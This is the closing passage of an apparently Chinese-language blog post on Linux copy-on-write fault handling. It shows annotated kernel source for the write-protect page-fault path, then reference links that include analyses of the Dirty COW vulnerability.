</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nf">reuse_swap_page</span><span class="p">(</span><span class="n">old_page</span><span class="p">))</span> <span class="p">{</span>	<span class="c1">// 判断是否只有一个进程引用该页面，如果是则直接复用
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * The page is all ours.  Move it to our anon_vma so
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * the rmap code will not search our parent or siblings.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 * Protected against the rmap code by the page lock.
</span></span></span><span class="line"><span class="cl"><span class="cm">			 */</span>
</span></span><span class="line"><span class="cl">			<span class="nf">page_move_anon_rmap</span><span class="p">(</span><span class="n">old_page</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">);</span>	<span class="c1">// 移动页面到匿名映射区
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>			<span class="nf">unlock_page</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">			<span class="k">return</span> <span class="nf">wp_page_reuse</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">page_table</span><span class="p">,</span> <span class="n">ptl</span><span class="p">,</span>	<span class="c1">// 重用页面
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					     <span class="n">orig_pte</span><span class="p">,</span> <span class="n">old_page</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">		<span class="p">}</span>
</span></span><span class="line"><span class="cl">		<span class="nf">unlock_page</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nf">unlikely</span><span class="p">((</span><span class="n">vma</span><span class="o">-&gt;</span><span class="n">vm_flags</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">VM_WRITE</span><span class="o">|</span><span class="n">VM_SHARED</span><span class="p">))</span> <span class="o">==</span>
</span></span><span class="line"><span class="cl">					<span class="p">(</span><span class="n">VM_WRITE</span><span class="o">|</span><span class="n">VM_SHARED</span><span class="p">)))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">wp_page_shared</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">page_table</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">				      <span class="n">ptl</span><span class="p">,</span> <span class="n">orig_pte</span><span class="p">,</span> <span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="cm">/*
</span></span></span><span class="line"><span class="cl"><span class="cm">	 * Ok, we need to copy. Oh, well..
</span></span></span><span class="line"><span class="cl"><span class="cm">	 */</span>
</span></span><span class="line"><span class="cl">	<span class="nf">page_cache_get</span><span class="p">(</span><span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="nf">pte_unmap_unlock</span><span class="p">(</span><span class="n">page_table</span><span class="p">,</span> <span class="n">ptl</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">wp_page_copy</span><span class="p">(</span><span class="n">mm</span><span class="p">,</span> <span class="n">vma</span><span class="p">,</span> <span class="n">address</span><span class="p">,</span> <span class="n">page_table</span><span class="p">,</span> <span class="n">pmd</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">			    <span class="n">orig_pte</span><span class="p">,</span> <span class="n">old_page</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><h2 id="reference">Reference</h2>
<ul>
<li><a href="https://www.cnblogs.com/binlovetech/p/17918733.html">一文聊透 Linux 缺页异常的处理 —— 图解 Page Faults</a></li>
<li><a href="https://www.cnblogs.com/binlovetech/p/17754173.html">从内核世界透视 mmap 内存映射的本质（源码实现篇）</a></li>
<li><a href="https://xz.aliyun.com/t/7561?time__1311=n4%2BxnD0G0%3D14gDBqPod4iIQ0I%3DD5G80ePD&alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-7">CVE-2016-5195漏洞分析与复现</a></li>
<li><a href="https://www.anquanke.com/post/id/84784">【漏洞分析】CVE-2016-5195 Dirtycow: Linux内核提权漏洞分析</a></li>
<li><a href="https://www.anquanke.com/post/id/290851">Linux 缺页异常处理流程分析与CVE-2021-5195分析</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/25918300">Linux高危漏洞Dirtycow整理</a></li>
<li><a href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf">奔跑吧Linux内核</a></li>
</ul>

            </div>
        </article>





<br>
<script src="https://utteranc.es/client.js"
        repo="ASUKA39/asuka39.github.io"
        issue-term="pathname"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script></main>
</div>
<footer class="footer">
    

    
    
</footer><a href="#" title="Go to top" id="totop">
    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
</svg>

</a>


    




    
    
        
    

    
    
        
    



    
    <script src="https://asuka39.github.io/js/main.min.35f435a5d8eac613c52daa28d8af544a4512337d3e95236e4a4978417b8dcb2f.js" integrity="sha256-NfQ1pdjqxhPFLaoo2K9USkUSM30&#43;lSNuSkl4QXuNyy8="></script>

    

</body>
</html>
